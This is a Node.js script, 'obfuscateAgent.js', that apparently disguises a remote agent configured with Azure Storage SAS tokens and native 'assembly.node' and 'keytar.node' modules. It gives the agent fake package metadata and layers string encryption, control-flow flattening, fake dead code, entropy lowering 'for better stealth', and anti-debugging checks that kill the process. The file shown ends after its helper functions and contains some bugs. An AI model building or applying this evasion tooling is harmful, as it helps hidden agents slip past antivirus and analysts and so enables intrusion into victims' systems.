const fs = require('fs');
const cluster = require('node:cluster');
const crypto = require('node:crypto');
const os = require('node:os');
const { performance } = require('node:perf_hooks');
const path = require('path');
const readline = require('readline');

// ---------- CLI Argument Parsing ----------
const rawArgs = process.argv.slice(2);
const argMap = {};
let appNameArg = null;

// Parse arguments and app name
for (let i = 0; i < rawArgs.length; i++) {
    const arg = rawArgs[i];

    if (!arg.startsWith('-') && appNameArg === null) {
        appNameArg = arg;
        continue;
    }

    if (arg.startsWith('--')) {
        const [key, value] = arg.includes('=')
            ? arg.slice(2).split('=')
            : [arg.slice(2), rawArgs[i + 1] && !rawArgs[i + 1].startsWith('-') ? rawArgs[++i] : true];
        argMap[key] = value;
    } else if (arg.startsWith('-')) {
        const key = arg.slice(1);
        const value = rawArgs[i + 1] && !rawArgs[i + 1].startsWith('-') ? rawArgs[++i] : true;
        argMap[key] = value;
    }
}

//console.log(`Args :\r\n${JSON.stringify(argMap)}`);

// Sanitize appNameArg to comply with npm package.json rules
if (appNameArg) {
    appNameArg = appNameArg
        .toLowerCase()
        .replace(/[^a-z0-9-]/g, '')         // Remove invalid chars
        .replace(/^[^a-z]+/, '');           // Ensure starts with a letter
}

const isDebug = !!(argMap.debug || argMap.d);
const obfuscationLevel = argMap.level || 'medium'; // low, medium, high, extreme
const useExternalObfuscator = argMap.useExternal !== 'false'; // default true
const numWorkers = Math.min(parseInt(argMap.workers || '1', 10), os.cpus().length);
const useFaker = argMap.useFaker !== 'false'; // default true

if (isDebug) {
    console.log("Parsed arguments:", argMap);
    console.log("Sanitized App Name:", appNameArg);
    console.log("Obfuscation Level:", obfuscationLevel);
    console.log("Workers:", numWorkers);
}

// ---------- Help Menu ----------
if (argMap.h || argMap.help) {
    console.log(`
Usage: node obfuscateAgent.js [AppName] [options]

Arguments:
  AppName                     Optional. Used to name the final output in package.json.
                              Must be lowercase, start with a letter, contain only letters, numbers, or dashes.
  --account <StorageAccount>  Azure Storage Account name. Will prompt if not provided.
  --token <SASToken>          Azure SAS Token. Will prompt if not provided.
  --meta <ContainerName>      Container name for metadata. If omitted, a random name is generated.
  --level <level>             Obfuscation level: low, medium, high, extreme (default: medium)
  --workers <number>          Number of worker processes for parallel obfuscation (default: 1)
  --useExternal <boolean>     Whether to use external obfuscator if available (default: true)
  --useFaker <boolean>        Wether to use faker.js library for dead code generation (default: true)
  --reducedEntropy <boolean>  Apply entropy reduction techniques (default: true)
  --cleanup                   Remove node modules, package.json, and other dependency files after execution.
  -h, --help                  Show this help message and exit.
  --debug, -d                 Enable verbose output about file operations.

Example:
  node obfuscateAgent.js MyTool --account myacct --token 'se=2025...' --meta metaX123456 --level high --workers 4

This script:
  - Obfuscates JavaScript files in ./agent and writes to ./app
  - Implements multiple layers of code protection (String encryption, control flow obfuscation, etc.)
  - Updates ./agent/config.js with storage config
  - Copies config to ./config.js
  - Generates or updates package.json with random metadata
  - [Optional] Cleans up node_modules, package.json, etc. after execution
`);
    process.exit(0);
}

// ---------- Script State ----------
const sourceDir = path.join(__dirname, "agent");
const outputDir = path.join(__dirname, "app");
const configSrcPath = path.join(sourceDir, 'config.js');
const configCopyPath = path.join(__dirname, 'config.js');
const pkgSrcPath = path.join(sourceDir, 'package.json');
const pkgDstPath = path.join(outputDir, 'package.json');
const AssemblySrcPath = path.join(sourceDir, 'assembly.node');
const AssemblyDstPath = path.join(outputDir, 'assembly.node');
const scexecSrcPath = path.join(sourceDir, 'keytar.node');
const scexecDstPath = path.join(outputDir, 'keytar.node');
const tempDir = path.join(os.tmpdir(), 'obf-' + crypto.randomBytes(8).toString('hex'));
const cleanupTargets = [
    path.join(__dirname, 'node_modules'),
    path.join(__dirname, 'package.json'),
    path.join(__dirname, 'package-lock.json'),
    tempDir
];

// Faker-like data generation pools for variable names, comments, and dead code
const fakerPools = {
    domains: ["tech", "org", "net", "io", "dev", "info", "cloud", "app"],
    companies: ["Acme", "Globex", "Initech", "Umbrella", "Cyberdyne", "Wayne", "Stark", "Oscorp"],
    products: ["Dashboard", "Monitor", "Scanner", "Optimizer", "Framework", "Toolkit", "Platform", "Suite"],
    departments: ["IT", "Engineering", "Development", "RnD", "Security", "Operations", "QA", "DevOps"],
    verbs: ["process", "analyze", "calculate", "validate", "transform", "optimize", "sanitize", "normalize"],
    adjectives: ["advanced", "secure", "efficient", "robust", "dynamic", "flexible", "modular", "scalable"],
    nouns: ["configuration", "parameter", "algorithm", "protocol", "module", "component", "instance", "service", "resource", "utility", "connection"],
    metrics: ["latency", "throughput", "bandwidth", "performance", "utilization", "availability", "reliability", "concurrency"],
    languages: ["JavaScript", "TypeScript", "Python", "Rust", "Go", "Java", "C#", "Ruby"],
    dataTypes: ["string", "number", "boolean", "object", "array", "function", "promise", "buffer", "stream"],
    formats: ["JSON", "XML", "CSV", "YAML", "Base64", "JWT", "HTML", "Markdown"],
    comments: [
        "Initialize the module",
        "Configure service parameters",
        "Validate input data",
        "Process API response",
        "Handle error conditions",
        "Optimize performance",
        "Apply security measures",
        "Clean up resources",
        "Cache results for efficiency",
        "Log diagnostic information",
        "Check for edge cases",
        "Transform data format",
        "Implement retry logic",
        "Enable feature flags",
        "Set default values"
    ]
};

const names = ["super-app", "cool-tool", "dev-helper", "ai-wizard", "code-master", "js-toolkit", "node-expert", "web-innovator"];
const authors = ["Alice", "Bob", "Charlie", "Dana", "Elena", "Frank", "Gina", "Hector"];
const descriptions = [
    "An innovative AI solution.",
    "A tool for cutting-edge development.",
    "A next-gen automation engine.",
    "Intelligent development assistant.",
    "Streamlined workflow automation.",
    "Advanced code analysis toolkit."
];
const licenses = ["MIT", "Apache-2.0", "ISC", "BSD-3-Clause", "GPL-3.0"];
const keywords = ["development", "AI", "automation", "tools", "productivity", "javascript", "nodejs"];

function fakerJsData() {
    try {
        const { faker } = require('@faker-js/faker');
        const data = [];
        const numberOfWords = Math.floor(Math.random() * 20) + 1;
        for (let i = 0; i < numberOfWords; i++) {
            const git = faker.helpers.arrayElement(faker.git.commitSha());
            const domain = faker.helpers.arrayElement(faker.internet.domainName());
            const hacker = faker.helpers.arrayElement(faker.hacker.adjective());
            data.push(...git, ...domain, ...hacker);
        }
        return data;
    }
    catch (error) {
        if (error.code === 'MODULE_NOT_FOUND') {
            console.warn("'@faker-js/faker' not found, using pre-defined pool.");
            hasExternalObfuscator = false;
        } else {
            console.error("Error generating faker data:", error);
            return [];
        }
    }
}

// Dead code snippets for injection with faker-like variable names
function generateDeadCodeSnippets() {
    const fakerData = useFaker ? fakerJsData() : [];
    const pool = useFaker ? fakerPools : {
        ...fakerData,
        ...fakerPools
    };
    const varName = () => {
        const verb = pool.verbs[Math.floor(Math.random() * pool.verbs.length)];
        const noun = pool.nouns[Math.floor(Math.random() * pool.nouns.length)];
        return `${verb}${noun[0].toUpperCase()}${noun.slice(1)}`;
    };

    const commentLine = () => {
        return `// ${pool.comments[Math.floor(Math.random() * pool.comments.length)]}`;
    };

    return [
        `${commentLine()}
function ${varName()}() { 
    const start = Date.now(); 
    while(Date.now() - start < ${Math.floor(Math.random() * 10)}) {} 
    return Math.random() > 0.5; 
}`,
        `${commentLine()}
const ${varName()} = Buffer.from('${crypto.randomBytes(16).toString('base64')}', 'base64');`,
        `${commentLine()}
try { 
    const ${varName()} = process.env.NODE_ENV === 'production' ? 'prod' : 'dev';
} catch(e) { 
    console.error('Environment check failed'); 
}`,
        `${commentLine()}
const ${varName()} = (a, b) => {
    ${commentLine()}
    return a < b ? -1 : a > b ? 1 : 0;
};`,
        `${commentLine()}
function ${varName()}(str) {
    ${commentLine()}
    return str.split('').map(c => c.charCodeAt(0)).reduce((a, b) => a + b, 0);
}`,
        `${commentLine()}
const ${varName()} = {
    ${pool.adjectives[Math.floor(Math.random() * pool.adjectives.length)]}: true,
    ${pool.metrics[Math.floor(Math.random() * pool.metrics.length)]}: ${Math.floor(Math.random() * 1000)},
    ${pool.dataTypes[Math.floor(Math.random() * pool.dataTypes.length)]}: null
};`,
        `${commentLine()}
function ${varName()}() {
    const ${varName()} = new Date();
    return ${varName()}.toISOString();
}`
    ];
}

// Variables for obfuscation state
let encryptionKeys = {};
let identifierMap = {};
let stringArrayData = {
    array: [],
    indices: {},
    accessors: []
};

// ---------- Secure Cryptographic Utilities ----------

function secureHash(data, salt = '') {
    try {
        return crypto.createHash('sha3-256').update(data + salt).digest('hex');
    } catch (err) {
        return crypto.createHash('sha256').update(data + salt).digest('hex');
    }
}

function generateSecureIdentifier(original, salt = '') {
    const hash = secureHash(original + salt).substring(0, 8);
    return '_' + hash.replace(/[0-9]/, c => String.fromCharCode(97 + parseInt(c)));
}

// ---------- Shannon Entropy Analysis and Reduction ----------

function calculateEntropy(str) {
    const len = str.length;
    const frequencies = {};

    for (let i = 0; i < len; i++) {
        const char = str.charAt(i);
        frequencies[char] = (frequencies[char] || 0) + 1;
    }

    let entropy = 0;
    for (const char in frequencies) {
        const probability = frequencies[char] / len;
        entropy -= probability * (Math.log(probability) / Math.log(2));
    }

    return entropy;
}

// Reduce entropy while maintaining obfuscation
function reduceEntropy(code) {
    const originalEntropy = calculateEntropy(code);
    if (isDebug) console.log(`Original entropy: ${originalEntropy.toFixed(4)} bits/symbol`);

    let result = code;

    // Add whitespace patterns to reduce entropy
    result = result.replace(/}/g, (match) => Math.random() < 0.7 ? '}\n\n' : match);
    result = result.replace(/{/g, (match) => Math.random() < 0.7 ? '{\n  ' : match);

    result = result.replace(/~/g, '!'); // Replace tilde with exclamation point where safe

    const pool = fakerPools;
    const comments = pool.comments;

    result = result.replace(/;/g, (match) => {
        return Math.random() < 0.05 ?
            `; // ${comments[Math.floor(Math.random() * comments.length)]}` :
            match;
    });

    const humanVarNames = [
        'userData', 'clientConfig', 'apiResponse', 'errorHandler',
        'eventListener', 'dataProcessor', 'cacheManager', 'sessionInfo'
    ];

    for (let i = 0; i < 10; i++) {
        if (Math.random() < 0.7) {
            const varName = humanVarNames[Math.floor(Math.random() * humanVarNames.length)];
            const insertPos = Math.floor(Math.random() * (result.length - 100)) + 50;
            const lineEnd = result.indexOf('\n', insertPos);

            if (lineEnd !== -1) {
                result = result.substring(0, lineEnd) +
                    `\n// ${varName} configuration` +
                    result.substring(lineEnd);
            }
        }
    }

    const patterns = [
        '\n// ---- Configuration ----\n',
        '\n// ---- Processing ----\n',
        '\n// ---- Initialization ----\n',
        '\n// ---- Validation ----\n'
    ];

    for (let i = 0; i < 3; i++) {
        const pattern = patterns[Math.floor(Math.random() * patterns.length)];
        const insertPos = Math.floor((i + 1) * result.length / 4); // Distribute across code
        const lineEnd = result.indexOf('\n', insertPos);

        if (lineEnd !== -1) {
            result = result.substring(0, lineEnd) + pattern + result.substring(lineEnd);
        }
    }

    const newEntropy = calculateEntropy(result);
    if (isDebug) {
        console.log(`Reduced entropy: ${newEntropy.toFixed(4)} bits/symbol`);
        console.log(`Entropy reduction: ${((originalEntropy - newEntropy) / originalEntropy * 100).toFixed(2)}%`);
    }

    return result;
}

// ---------- Mixed Boolean-Arithmetic (MBA) Obfuscation ----------

// Apply Mixed Boolean-Arithmetic transformations
function applyMBAObfuscation(num) {
    if (typeof num !== 'number' || isNaN(num)) return num.toString();

    // Integer-specific MBA transformations
    if (Number.isInteger(num)) {
        const mbaExpressions = [
            n => `((${n} ^ 0) + 2 * (${n} & 0))`,
            n => `((${n} | 0) + (${n} & 0))`,
            n => `((${n} & ~0) | (${n} & 0))`,
            n => `(${n} * (0 | 1) - ${n} * 0)`,
            n => `((${n} | 0) - (${n} & 0))`,
            n => {
                const y = Math.floor(Math.random() * 1000);
                return `(${n} + (${y} - ${y}))`;
            },
            n => `(~(~${n}))`,
            n => {
                const y = Math.floor(Math.random() * 1000);
                return `((${n} ^ ${y}) ^ ${y})`;
            },
            n => `(((${n} | 0) & (${n} | ~0)))`,
            n => {
                const y = Math.floor(Math.random() * 4);
                return `((${n} << ${y}) >> ${y})`;
            },
            n => {
                const y = 1 + Math.floor(Math.random() * 3);
                return `((((${n} >> ${y}) << ${y}) | ((${n} << (32 - ${y})) >> (32 - ${y}))))`;
            }
        ];

        const expr = mbaExpressions[Math.floor(Math.random() * mbaExpressions.length)];
        return expr(num);
    }
    // For floating point, use different techniques
    const floatExpressions = [
        n => `(${Math.floor(n)} + ${n - Math.floor(n)})`,
        n => `(${n} + 0)`,
        n => `(${n} * 1)`,
        n => {
            const factor = Math.pow(10, Math.floor(Math.random() * 5) + 1);
            return `(${n * factor} / ${factor})`;
        }
    ];

    const expr = floatExpressions[Math.floor(Math.random() * floatExpressions.length)];
    return expr(num);
}

// ---------- Dead Word Injection and Realistic Dead Code ----------

// Create realistic-looking dead code using Faker-like data
function createFakerDeadCode() {
    const fakeData = useFaker ? fakerJsData() : [];
    const pool = useFaker ? fakerPools : { ...fakerPools, ...fakeData };
    const snippets = [];

    const varCount = 5 + Math.floor(Math.random() * 5);
    for (let i = 0; i < varCount; i++) {
        const adj = pool.adjectives[Math.floor(Math.random() * pool.adjectives.length)];
        const noun = pool.nouns[Math.floor(Math.random() * pool.nouns.length)];
        const varName = `${adj[0].toUpperCase()}${adj.slice(1)}${noun[0].toUpperCase()}${noun.slice(1)}`;

        let value;
        const valueType = Math.floor(Math.random() * 5);
        switch (valueType) {
            case 0: // String
                value = `'${pool.products[Math.floor(Math.random() * pool.products.length)]}'`;
                break;
            case 1: // Number
                value = Math.floor(Math.random() * 1000);
                break;
            case 2: // Boolean
                value = Math.random() > 0.5 ? 'true' : 'false';
                break;
            case 3: // Object
                value = `{ 
                    name: '${pool.products[Math.floor(Math.random() * pool.products.length)]}', 
                    version: '${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 10)}',
                    enabled: ${Math.random() > 0.5 ? 'true' : 'false'}
                }`;
                break;
            case 4: // Array
                const items = [];
                const itemCount = 2 + Math.floor(Math.random() * 3);
                for (let j = 0; j < itemCount; j++) {
                    items.push(`'${pool.formats[Math.floor(Math.random() * pool.formats.length)]}'`);
                }
                value = `[${items.join(', ')}]`;
                break;
        }

        snippets.push(`// ${pool.comments[Math.floor(Math.random() * pool.comments.length)]}\nconst ${varName} = ${value};`);
    }

    const funcCount = 2 + Math.floor(Math.random() * 3);
    for (let i = 0; i < funcCount; i++) {
        const verb = pool.verbs[Math.floor(Math.random() * pool.verbs.length)];
        const noun = pool.nouns[Math.floor(Math.random() * pool.nouns.length)];
        const funcName = `${verb}${noun[0].toUpperCase()}${noun.slice(1)}`;

        const paramCount = Math.floor(Math.random() * 3);
        const params = [];
        for (let j = 0; j < paramCount; j++) {
            params.push(pool.dataTypes[Math.floor(Math.random() * pool.dataTypes.length)] + j);
        }

        // Generate body
        const bodyLines = [];
        const lineCount = 2 + Math.floor(Math.random() * 4);
        for (let j = 0; j < lineCount; j++) {
            const commentChance = Math.random();
            if (commentChance < 0.4) {
                bodyLines.push(`    // ${pool.comments[Math.floor(Math.random() * pool.comments.length)]}`);
            }

            const dataType = pool.dataTypes[Math.floor(Math.random() * pool.dataTypes.length)];
            const varName = `${dataType}Value`;
            const metric = pool.metrics[Math.floor(Math.random() * pool.metrics.length)];

            if (j === lineCount - 1) {
                bodyLines.push(`    return ${varName};`);
            } else {
                const lineType = Math.floor(Math.random() * 3);
                switch (lineType) {
                    case 0:
                        bodyLines.push(`    const ${varName} = ${Math.floor(Math.random() * 100)};`);
                        break;
                    case 1:
                        bodyLines.push(`    let ${varName} = process.env.NODE_ENV === 'production' ? 100 : 0;`);
                        break;
                    case 2:
                        bodyLines.push(`    const ${varName} = {
        ${metric}: ${Math.floor(Math.random() * 1000)},
        unit: 'ms',
        timestamp: Date.now()
    };`);
                        break;
                }
            }
        }

        snippets.push(`
/**
 * ${pool.comments[Math.floor(Math.random() * pool.comments.length)]}
 * @param {${params.length > 0 ? pool.dataTypes[Math.floor(Math.random() * pool.dataTypes.length)] : ''}} ${params[0] || ''}
 * @returns {Object}
 */
function ${funcName}(${params.join(', ')}) {
${bodyLines.join('\n')}
}`);
    }

    return snippets;
}

function injectFakerDeadCode(code, level = 'medium') {
    if (level === 'low') return code;

    const chunks = code.split(/({|})/g);
    let result = '';

    for (let i = 0; i < chunks.length; i++) {
        result += chunks[i];

        if (chunks[i] === '{' && Math.random() < getDeadCodeProbability(level)) {
            const fakerCode = createFakerDeadCode();
            const snippetCount = level === 'extreme' ?
                Math.floor(Math.random() * 3) + 3 :
                Math.floor(Math.random() * 2) + 1;

            for (let j = 0; j < snippetCount; j++) {
                const randomIndex = Math.floor(Math.random() * fakerCode.length);
                if (fakerCode[randomIndex]) {
                    result += '\n' + fakerCode[randomIndex] + '\n';
                }
            }
        }
    }

    return result;
}

function getDeadCodeProbability(level) {
    switch (level) {
        case 'medium': return 0.2;
        case 'high': return 0.4;
        case 'extreme': return 0.6;
        default: return 0.1;
    }
}

// ---------- Custom Obfuscation Utilities ----------

function generateIdentifier(original, seed) {
    return generateSecureIdentifier(original, seed.toString());
}

function encryptString(str, level = 'medium') {
    if (str.length < 3) return `'${str}'`;

    const stringKey = secureHash(str).substring(0, 16);
    encryptionKeys[stringKey] = crypto.randomBytes(16).toString('hex');

    let encrypted;

    switch (level) {
        case 'low':
            encrypted = Buffer.from(str).toString('base64');
            return `Buffer.from('${encrypted}', 'base64').toString()`;

        case 'medium':
            encrypted = '';
            const key = encryptionKeys[stringKey];
            for (let i = 0; i < str.length; i++) {
                const charCode = str.charCodeAt(i) ^ key.charCodeAt(i % key.length);
                encrypted += ('00' + charCode.toString(16)).slice(-2);
            }
            return `(function() {
        const key = '${key}';
        const encrypted = '${encrypted}';
        let result = '';
        for (let i = 0; i < encrypted.length; i += 2) {
          const charCode = parseInt(encrypted.substr(i, 2), 16) ^ key.charCodeAt((i/2) % key.length);
          result += String.fromCharCode(charCode);
        }
        return result;
      })()`;

        case 'high':
        case 'extreme':
            if (!stringArrayData.indices[str]) {
                stringArrayData.array.push(str);
                stringArrayData.indices[str] = stringArrayData.array.length - 1;
            }

            const index = stringArrayData.indices[str];
            let indexEncoded;

            if (level === 'extreme') {
                indexEncoded = `(${applyMBAObfuscation(index)})`;
            } else {
                indexEncoded = `(${generateMathExpression(index)})`;
            }

            if (stringArrayData.accessors.length === 0) {
                for (let i = 0; i < 3; i++) {
                    const accessorName = generateSecureIdentifier(`strArray${i}`, crypto.randomBytes(4).toString('hex'));
                    stringArrayData.accessors.push(accessorName);
                }
            }

            const accessor = stringArrayData.accessors[Math.floor(Math.random() * stringArrayData.accessors.length)];
            return `${accessor}(${indexEncoded})`;

        default:
            return `'${str}'`;
    }
}

function generateMathExpression(num) {
    const operations = [
        n => `(${n} + ${randomInt(1, 100)} - ${randomInt(1, 100)})`,
        n => `(${randomInt(1, 5)} * ${n} / ${randomInt(1, 5)})`,
        n => `(${n} ^ ${randomInt(1, 10)} ^ ${randomInt(1, 10)})`,
        n => `(${randomInt(1, 100)} - ${randomInt(1, 100)} + ${n})`,
        n => `Math.floor(${n} + Math.sin(${randomInt(0, 10)}) * ${randomInt(0, 1) ? '+' : '-'} 0)`,
        n => `Math.round(${n} * Math.cos(Math.PI) - ${n} * Math.sin(Math.PI) * Math.sin(Math.PI))`,
        n => `${n} * (Math.sin(Math.PI/2) + Math.cos(Math.PI) + 1)`,
        n => `Math.pow(Math.pow(${n}, 1/${randomInt(2, 4)}), ${randomInt(2, 4)})`,
        n => `Math.exp(Math.log(${n}) + Math.sin(Math.PI * 2))`,
        n => `${n} + Math.pow(Math.sin(${randomInt(1, 5)}), 2) + Math.pow(Math.cos(${randomInt(1, 5)}), 2) - 1`,
        n => `${n} * (Math.cosh(${randomInt(1, 3)}) / Math.cosh(${randomInt(1, 3)}))`,
        n => `${n} + (Math.sin(Math.PI) + Math.sin(Math.PI*2) + Math.sin(Math.PI*3))/100`,
        n => `Math.pow(Math.E, Math.log(${n}) * Math.pow(Math.cos(0), 2) + Math.log(${n}) * Math.pow(Math.sin(0), 2))`,
        n => `${n} + Math.sin(Math.PI) * (1 + 1/2 + 1/4 + 1/8 + 1/16)`,
        n => `Math.sqrt(Math.pow(${n}, 2) * Math.pow(Math.cos(0), 2) + Math.pow(${n}, 2) * Math.pow(Math.sin(0), 2))`,
        n => `${n} * ((Math.pow(${randomInt(2, 10)}, 2) - ${randomInt(1, 5)}) / (Math.pow(${randomInt(2, 10)}, 2) - ${randomInt(1, 5)}))`,
    ];

    let result = num;
    const opCount = randomInt(1, obfuscationLevel === 'extreme' ? 5 : 3);

    for (let i = 0; i < opCount; i++) {
        const op = operations[randomInt(0, operations.length - 1)];
        result = op(result);
    }

    return result;
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function flattenControlFlow(code) {
    const functionRegex = /function\s+(\w+)\s*\([^)]*\)\s*\{([\s\S]*?)\}/g;
    let match;
    let result = code;

    while ((match = functionRegex.exec(code)) !== null) {
        const fullMatch = match[0];
        const funcName = match[1];
        const funcBody = match[2];

        if (funcBody.length < 50 || funcBody.length > 1000) continue;

        const statements = funcBody.split(';').filter(s => s.trim().length > 0);
        if (statements.length < 3) continue;

        const flattenedCode = createFlattenedStructure(statements, funcName);

        result = result.replace(fullMatch, flattenedCode);
    }

    return result;
}

function createFlattenedStructure(statements, funcName) {
    const stateVar = `_state_${funcName}`;
    const switchCases = [];

    for (let i = 0; i < statements.length; i++) {
        const statement = statements[i].trim();
        if (!statement) continue;

        const endsCase = statement.includes('return') ||
            statement.includes('break') ||
            statement.includes('continue');

        if (endsCase) {
            switchCases.push(`case ${i}: ${statement}; break;`);
        } else {
            const nextState = i + 1;
            switchCases.push(`case ${i}: ${statement}; ${stateVar} = ${nextState}; break;`);
        }
    }

    return `function ${funcName}() {
    let ${stateVar} = 0;
    while(true) {
      switch(${stateVar}) {
        ${switchCases.join('\n        ')}
        default: return;
      }
    }
  }`;
}

function renameVariables(code, seed) {
    const varRegex = /\b(var|let|const)\s+(\w+)\b/g;
    let match;
    let result = code;

    while ((match = varRegex.exec(code)) !== null) {
        const originalName = match[2];

        if (identifierMap[originalName] || isReservedName(originalName)) continue;

        identifierMap[originalName] = generateIdentifier(originalName, seed);

        const replaceRegex = new RegExp(`\\b${originalName}\\b`, 'g');
        result = result.replace(replaceRegex, identifierMap[originalName]);
    }

    return result;
}

function isReservedName(name) {
    const reserved = ['arguments', 'await', 'break', 'case', 'catch', 'class', 'const',
        'continue', 'debugger', 'default', 'delete', 'do', 'else', 'enum', 'eval',
        'export', 'extends', 'false', 'finally', 'for', 'function', 'if', 'implements',
        'import', 'in', 'instanceof', 'interface', 'let', 'new', 'null', 'package',
        'private', 'protected', 'public', 'return', 'static', 'super', 'switch',
        'this', 'throw', 'true', 'try', 'typeof', 'var', 'void', 'while', 'with', 'yield'];

    return reserved.includes(name);
}

function customObfuscate(code, level = 'medium', seed = Math.random()) {
    const startTime = performance.now();

    identifierMap = {};
    stringArrayData = { array: [], indices: {}, accessors: [] };
    encryptionKeys = {};

    // Step 1: Extract and encrypt strings
    let processed = extractAndEncryptStrings(code, level);

    // Step 2: Rename variables and functions
    processed = renameVariables(processed, seed);

    // Step 3: Transform numbers to expressions or MBA (for higher levels)
    if (level === 'high' || level === 'extreme') {
        processed = transformNumbersToExpressions(processed, level);
    }

    // Step 4: Control flow flattening (for higher levels)
    if (level === 'high' || level === 'extreme') {
        processed = flattenControlFlow(processed);
    }

    // Step 5: Dead code and realistic variable injection
    processed = injectFakerDeadCode(processed, level);

    // Step 6: Add string array accessor if needed
    if (stringArrayData.array.length > 0) {
        processed = addMultiLayerStringArrays(processed, level);
    }

    // Step 7: Self-defending code for extreme level
    if (level === 'extreme') {
        processed = addSelfDefendingCode(processed);
    }

    // Step 8: Apply entropy reduction for better stealth
    if (argMap.reducedEntropy !== 'false') {
        processed = reduceEntropy(processed);
    }

    if (isDebug) {
        console.log(`Custom obfuscation took ${(performance.now() - startTime).toFixed(2)}ms`);
        console.log(`Strings extracted: ${stringArrayData.array.length}`);
        console.log(`Variables renamed: ${Object.keys(identifierMap).length}`);
    }

    return processed;
}

function extractAndEncryptStrings(code, level) {
    const stringRegex = /'([^'\\]*(\\.[^'\\]*)*)'|"([^"\\]*(\\.[^"\\]*)*)"/g;
    let match;
    let result = code;

    while ((match = stringRegex.exec(code)) !== null) {
        const fullMatch = match[0];
        const stringContent = match[1] || match[3];

        if (stringContent.length < 3) continue;

        if (isLikelyRegex(fullMatch, code, match.index)) continue;

        const encrypted = encryptString(stringContent, level);
        result = result.replace(fullMatch, encrypted);
    }

    return result;
}

function isLikelyRegex(str, code, position) {
    const prevChar = position > 0 ? code.charAt(position - 1) : '';
    return prevChar === '/' || prevChar === '=';
}

function transformNumbersToExpressions(code, level) {
    const numberRegex = /\b(\d+(\.\d+)?)\b/g;
    let match;
    let result = code;

    while ((match = numberRegex.exec(code)) !== null) {
        const fullMatch = match[0];
        const number = parseFloat(fullMatch);

        if (number < 10) continue;

        let expression;
        if (level === 'extreme' && Math.random() < 0.7) {
            expression = applyMBAObfuscation(number);
        } else if (level === 'high' && Math.random() < 0.4) {
            expression = applyMBAObfuscation(number);
        } else {
            expression = generateMathExpression(number);
        }

        result = result.replace(fullMatch, expression);
    }

    return result;
}

function addMultiLayerStringArrays(code, level) {
    if (stringArrayData.array.length === 0) return code;

    const primaryArray = [...stringArrayData.array];
    const secondaryArray = [...stringArrayData.array];

    shuffleArray(primaryArray);
    shuffleArray(secondaryArray);

    const primaryIndices = {};
    primaryArray.forEach((str, i) => {
        if (stringArrayData.indices[str] !== undefined) {
            primaryIndices[str] = i;
        }
    });

    let tertiaryArray = null;
    if (level === 'extreme') {
        tertiaryArray = [...stringArrayData.array];
        shuffleArray(tertiaryArray);
    }

    const primaryEncoded = primaryArray.map(str => Buffer.from(str).toString('base64'));
    const secondaryEncoded = secondaryArray.map(str => {
        return Buffer.from(str).toString('hex');
    });

    let arrayCode = '';
    const accessors = stringArrayData.accessors;

    if (level === 'extreme' && tertiaryArray) {
        const tertiaryEncoded = tertiaryArray.map(str => {
            const key = crypto.randomBytes(8).toString('hex');
            let encrypted = '';
            for (let i = 0; i < str.length; i++) {
                const charCode = str.charCodeAt(i) ^ key.charCodeAt(i % key.length);
                encrypted += ('00' + charCode.toString(16)).slice(-2);
            }
            return { data: encrypted, key };
        });

        arrayCode = `
        // String data containers
        const ${generateSecureIdentifier('stringContainer1')} = ${JSON.stringify(primaryEncoded)};
        const ${generateSecureIdentifier('stringContainer2')} = ${JSON.stringify(secondaryEncoded)};
        const ${generateSecureIdentifier('stringContainer3')} = ${JSON.stringify(tertiaryEncoded.map(e => e.data))};
        const ${generateSecureIdentifier('stringKeys')} = ${JSON.stringify(tertiaryEncoded.map(e => e.key))};
        
        // Primary accessor
        function ${accessors[0]}(idx) {
            return Buffer.from(${generateSecureIdentifier('stringContainer1')}[${applyMBAObfuscation('idx')}], 'base64').toString();
        }
        
        // Secondary accessor
        function ${accessors[1]}(idx) {
            return Buffer.from(${generateSecureIdentifier('stringContainer2')}[${applyMBAObfuscation('idx')}], 'hex').toString();
        }
        
        // Tertiary accessor with complex decryption
        function ${accessors[2]}(idx) {
            const _eIdx = ${applyMBAObfuscation('idx')};
            const _data = ${generateSecureIdentifier('stringContainer3')}[_eIdx];
            const _key = ${generateSecureIdentifier('stringKeys')}[_eIdx];
            let _result = '';
            for (let i = 0; i < _data.length; i += 2) {
                const charCode = parseInt(_data.substr(i, 2), 16) ^ _key.charCodeAt((i/2) % _key.length);
                _result += String.fromCharCode(charCode);
            }
            return _result;
        }`;
    } else {
        arrayCode = `
        // String data containers
        const ${generateSecureIdentifier('stringContainer1')} = ${JSON.stringify(primaryEncoded)};
        const ${generateSecureIdentifier('stringContainer2')} = ${JSON.stringify(secondaryEncoded)};
        
        // Primary accessor
        function ${accessors[0]}(idx) {
            return Buffer.from(${generateSecureIdentifier('stringContainer1')}[idx], 'base64').toString();
        }
        
        // Secondary accessor
        function ${accessors[1]}(idx) {
            return Buffer.from(${generateSecureIdentifier('stringContainer2')}[idx], 'hex').toString();
        }
        
        // Tertiary accessor (points to primary or secondary randomly)
        function ${accessors[2]}(idx) {
            return idx % 2 === 0 ? ${accessors[0]}(idx) : ${accessors[1]}(idx);
        }`;
    }

    let processedCode = code;
    for (const str in stringArrayData.indices) {
        if (primaryIndices[str] !== undefined) {
            const newIdx = primaryIndices[str];
            const strAccess = `_strArray(${stringArrayData.indices[str]})`;

            const accessor = accessors[Math.floor(Math.random() * accessors.length)];
            processedCode = processedCode.replace(
                new RegExp(strAccess, 'g'),
                `${accessor}(${level === 'extreme' ? applyMBAObfuscation(newIdx) : newIdx})`
            );
        }
    }

    return arrayCode + '\n' + processedCode;
}

function addSelfDefendingCode(code) {
    const hash = secureHash(code);

    const selfDefendingCode = `
  // Self-defending code
  (function() {
    const _originalCode = ${JSON.stringify(code)};
    const _expectedHash = '${hash}';
    const _checkCode = function() {
      const _checkInterval = setInterval(function() {
        try {
          const _currentCode = Function.prototype.toString.call(_checkCode).replace(/\\r?\\n/g, '');
          const _currentHash = require('crypto').createHash('sha256').update(_currentCode).digest('hex');
          if (_currentHash !== _expectedHash) {
            process.exit(1);
          }
        } catch(e) {
          // If error occurs (e.g., during debugging), take defensive action
          setTimeout(() => { 
            try { process.exit(1); } catch(e) {} 
          }, Math.floor(Math.random() * 1000));
        }
      }, 2000 + Math.floor(Math.random() * 3000));
      
      // Anti-debugging techniques
      const hrtime = process.hrtime();
      const start = hrtime[0] * 1e9 + hrtime[1];
      setTimeout(() => {
        const end = process.hrtime();
        const elapsed = end[0] * 1e9 + end[1] - start;
        if (elapsed > 1e8) { // Debugger detected if time difference is too large
          process.exit(1); 
        }
      }, 1);
    };
    _checkCode();
  })();`;

    return selfDefendingCode + '\n' + code;
}

